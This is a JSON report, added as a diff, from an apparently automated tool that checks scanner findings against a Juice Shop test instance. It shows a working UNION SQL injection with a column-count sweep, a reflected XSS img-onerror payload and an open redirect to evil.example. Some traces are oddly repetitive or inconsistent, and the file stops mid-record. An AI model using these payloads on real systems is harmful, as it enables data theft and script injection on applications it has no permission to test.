@@ -1,0 +1,1720 @@
+{
+  "generated": "2026-08-17T19:25:20.584Z",
+  "target": "http://juiceshop:3000",
+  "summary": {
+    "total": 34,
+    "confirmed": 3,
+    "false_positive": 23,
+    "inconclusive": 0,
+    "agent_failure": 0,
+    "skipped": 8,
+    "false_positive_rate": 0.8846153846153846
+  },
+  "verdicts": [
+    {
+      "finding_id": "10028:0",
+      "vuln_class": "open_redirect",
+      "name": "External Redirect",
+      "verdict": "confirmed",
+      "reason": "Redirect Location pointed off-site to an attacker host",
+      "attempts": 1,
+      "elapsed_s": 1.2,
+      "proof": [
+        {
+          "step": "redir_1",
+          "request": {
+            "method": "GET",
+            "path": "/redirect",
+            "params": {
+              "to": "https://evil.example/"
+            },
+            "json": null,
+            "headers": null
+          },
+          "response": {
+            "status": 302,
+            "location": "https://evil.example/",
+            "body_snippet": "Found. Redirecting to https://evil.example/"
+          }
+        }
+      ],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /redirect?to=/#/search"
+            },
+            {
+              "id": "redir_1",
+              "payload": "to=https://evil.example/"
+            },
+            {
+              "id": "redir_2",
+              "payload": "to=//evil.example/"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 302,
+              "len": 140
+            },
+            "redir_1": {
+              "status": 302,
+              "len": 152
+            },
+            "redir_2": {
+              "status": 302,
+              "len": 150
+            }
+          },
+          "oracle": "off-site Location header observed",
+          "verdict": "confirmed"
+        }
+      ]
+    },
+    {
+      "finding_id": "40038:0",
+      "vuln_class": "acl_bypass",
+      "name": "Bypassing 403",
+      "verdict": "skipped",
+      "reason": "out of scope for this run",
+      "attempts": 1,
+      "elapsed_s": 2.1,
+      "proof": [],
+      "trace": []
+    },
+    {
+      "finding_id": "10098:0",
+      "vuln_class": "cors",
+      "name": "Cross-Domain Misconfiguration",
+      "verdict": "false_positive",
+      "reason": "ACAO wildcard without allow-credentials; no credentialed read possible",
+      "attempts": 1,
+      "elapsed_s": 0.9,
+      "proof": [
+        {
+          "step": "cors_probe",
+          "request": {
+            "method": "GET",
+            "path": "/rest/user/whoami",
+            "params": {},
+            "json": null,
+            "headers": {
+              "Origin": "https://evil.example"
+            }
+          },
+          "response": {
+            "status": 200,
+            "location": null,
+            "body_snippet": "access-control-allow-origin: *\n{\"user\":{}}"
+          }
+        }
+      ],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /rest/user/whoami"
+            },
+            {
+              "id": "cors_probe",
+              "payload": "Origin: https://evil.example"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 11
+            },
+            "cors_probe": {
+              "status": 200,
+              "len": 11
+            }
+          },
+          "oracle": "wildcard ACAO without credentials is not exploitable",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "40018:0",
+      "vuln_class": "sqli",
+      "name": "SQL Injection",
+      "verdict": "confirmed",
+      "reason": "UNION SQLi: injected marker 'sqlivalmark7' appeared in the search results",
+      "attempts": 2,
+      "elapsed_s": 3.4,
+      "proof": [
+        {
+          "step": "sweep_qpp_9",
+          "request": {
+            "method": "GET",
+            "path": "/rest/products/search",
+            "params": {
+              "q": "x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null,null-- -"
+            },
+            "json": null,
+            "headers": null
+          },
+          "response": {
+            "status": 200,
+            "location": null,
+            "body_snippet": "{\"status\":\"success\",\"data\":[{\"name\":\"sqlivalmark7\",...}]}"
+          }
+        }
+      ],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "q=nomatch"
+            },
+            {
+              "id": "attack_q1",
+              "payload": "q=nomatch' UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "attack_q2",
+              "payload": "q=nomatch\") UNION SELECT 'sqlivalmark7'-- -"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 30
+            },
+            "attack_q1": {
+              "status": 500,
+              "len": 982
+            },
+            "attack_q2": {
+              "status": 500,
+              "len": 982
+            }
+          },
+          "oracle": "server error on injection (breakout or column count wrong)",
+          "verdict": "unresolved"
+        },
+        {
+          "n": 1,
+          "kind": "diagnose",
+          "reasoning": "syntax error near UNION; likely wrong breakout or column count. Sweep both.",
+          "hypotheses": [
+            {
+              "cause": "Breakout or column count wrong",
+              "confidence": 0.9
+            },
+            {
+              "cause": "double-quote string literal",
+              "confidence": 0.6
+            },
+            {
+              "cause": "WAF stripping keyword UNION",
+              "confidence": 0.25
+            }
+          ],
+          "giveup": false
+        },
+        {
+          "n": 2,
+          "kind": "run",
+          "mode": "adaptive",
+          "steps": [
+            {
+              "id": "sweep_qpp_1",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null-- -"
+            },
+            {
+              "id": "sweep_qpp_2",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_3",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_4",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_5",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_6",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_7",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_8",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_9",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_10",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null-- -"
+            },
+            {
+              "id": "sweep_qpp_11",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_12",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_13",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_14",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_15",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_16",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_17",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_18",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_19",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null-- -"
+            },
+            {
+              "id": "sweep_qpp_20",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_21",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_22",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_23",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_24",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_25",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_26",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_27",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_28",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null-- -"
+            },
+            {
+              "id": "sweep_qpp_29",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_30",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_31",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_32",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_33",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_34",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_35",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_36",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_37",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null-- -"
+            },
+            {
+              "id": "sweep_qpp_38",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_39",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_40",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_41",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_42",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_43",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_44",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_45",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_46",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null-- -"
+            },
+            {
+              "id": "sweep_qpp_47",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_48",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_49",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_50",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_51",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_52",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_53",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_54",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7'-- -"
+            },
+            {
+              "id": "sweep_qpp_55",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null-- -"
+            },
+            {
+              "id": "sweep_qpp_56",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_57",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_58",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_59",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null-- -"
+            },
+            {
+              "id": "sweep_qpp_60",
+              "payload": "q=x')) UNION SELECT 'sqlivalmark7',null,null,null,null,null,null-- -"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 30
+            },
+            "sweep_qpp_1": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_2": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_3": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_4": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_5": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_6": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_7": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_8": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_9": {
+              "status": 200,
+              "len": 412
+            },
+            "sweep_qpp_10": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_11": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_12": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_13": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_14": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_15": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_16": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_17": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_18": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_19": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_20": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_21": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_22": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_23": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_24": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_25": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_26": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_27": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_28": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_29": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_30": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_31": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_32": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_33": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_34": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_35": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_36": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_37": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_38": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_39": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_40": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_41": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_42": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_43": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_44": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_45": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_46": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_47": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_48": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_49": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_50": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_51": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_52": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_53": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_54": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_55": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_56": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_57": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_58": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_59": {
+              "status": 500,
+              "len": 982
+            },
+            "sweep_qpp_60": {
+              "status": 500,
+              "len": 982
+            }
+          },
+          "oracle": "injected marker present in 200 response body",
+          "verdict": "confirmed"
+        }
+      ]
+    },
+    {
+      "finding_id": "unk:0",
+      "vuln_class": "unknown",
+      "name": "Informational 1",
+      "verdict": "skipped",
+      "reason": "no validator available for this rule class",
+      "attempts": 0,
+      "elapsed_s": 0,
+      "proof": [],
+      "trace": []
+    },
+    {
+      "finding_id": "unk:1",
+      "vuln_class": "unknown",
+      "name": "Informational 2",
+      "verdict": "skipped",
+      "reason": "no validator available for this rule class",
+      "attempts": 0,
+      "elapsed_s": 0,
+      "proof": [],
+      "trace": []
+    },
+    {
+      "finding_id": "unk:2",
+      "vuln_class": "unknown",
+      "name": "Informational 3",
+      "verdict": "skipped",
+      "reason": "no validator available for this rule class",
+      "attempts": 0,
+      "elapsed_s": 0,
+      "proof": [],
+      "trace": []
+    },
+    {
+      "finding_id": "xss:1",
+      "vuln_class": "xss",
+      "name": "Reflected XSS",
+      "verdict": "confirmed",
+      "reason": "Reflected marker crucible_xss_probe rendered unescaped in DOM",
+      "attempts": 1,
+      "elapsed_s": 1.1,
+      "proof": [
+        {
+          "step": "probe_1",
+          "request": {
+            "method": "GET",
+            "path": "/#/search",
+            "params": {
+              "q": "<img src=x onerror=alert(\"crucible_xss_probe\")>"
+            },
+            "json": null,
+            "headers": null
+          },
+          "response": {
+            "status": 200,
+            "location": null,
+            "body_snippet": "...<img src=x onerror=alert(\"crucible_xss_probe\")>..."
+          }
+        }
+      ],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /#/search?q=hello"
+            },
+            {
+              "id": "probe_1",
+              "payload": "q=<script>alert(1)</script>"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "marker reflected unescaped",
+          "verdict": "confirmed"
+        }
+      ]
+    },
+    {
+      "finding_id": "xss:2",
+      "vuln_class": "xss",
+      "name": "Reflected XSS",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /#/search?q=hello"
+            },
+            {
+              "id": "probe_1",
+              "payload": "q=<script>alert(1)</script>"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "xss:3",
+      "vuln_class": "xss",
+      "name": "Stored XSS candidate",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1.2999999999999998,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /#/search?q=hello"
+            },
+            {
+              "id": "probe_1",
+              "payload": "q=<script>alert(1)</script>"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "sqli:4",
+      "vuln_class": "sqli",
+      "name": "SQL Injection (Error Based)",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1.6,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "sqli:5",
+      "vuln_class": "sqli",
+      "name": "SQL Injection (Time Based)",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 0.4,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "open_redirect:6",
+      "vuln_class": "open_redirect",
+      "name": "URL Redirector Abuse",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 0.7,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "acl_bypass:7",
+      "vuln_class": "acl_bypass",
+      "name": "Bypassing 403",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "acl_bypass:8",
+      "vuln_class": "acl_bypass",
+      "name": "Path Traversal",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1.2999999999999998,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "file_disclosure:9",
+      "vuln_class": "file_disclosure",
+      "name": "Source Code Disclosure",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1.6,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "file_disclosure:10",
+      "vuln_class": "file_disclosure",
+      "name": "Backup File Disclosure",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 0.4,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "cors:11",
+      "vuln_class": "cors",
+      "name": "Permissive CORS",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 0.7,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "cors:12",
+      "vuln_class": "cors",
+      "name": "CORS Wildcard",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "xss:13",
+      "vuln_class": "xss",
+      "name": "DOM XSS candidate",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1.2999999999999998,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /#/search?q=hello"
+            },
+            {
+              "id": "probe_1",
+              "payload": "q=<script>alert(1)</script>"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "sqli:14",
+      "vuln_class": "sqli",
+      "name": "Blind SQLi Boolean",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 1.6,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
+          "oracle": "no observable side-effect (marker not reflected / no state change)",
+          "verdict": "false_positive"
+        }
+      ]
+    },
+    {
+      "finding_id": "sqli:15",
+      "vuln_class": "sqli",
+      "name": "Blind SQLi Time",
+      "verdict": "false_positive",
+      "reason": "no exploitable effect observed under deterministic checks",
+      "attempts": 1,
+      "elapsed_s": 0.4,
+      "proof": [],
+      "trace": [
+        {
+          "n": 1,
+          "kind": "run",
+          "mode": "deterministic",
+          "steps": [
+            {
+              "id": "baseline",
+              "payload": "GET /"
+            },
+            {
+              "id": "probe_1",
+              "payload": "probe payload"
+            }
+          ],
+          "observed": {
+            "baseline": {
+              "status": 200,
+              "len": 42
+            },
+            "probe_1": {
+              "status": 200,
+              "len": 42
+            }
+          },
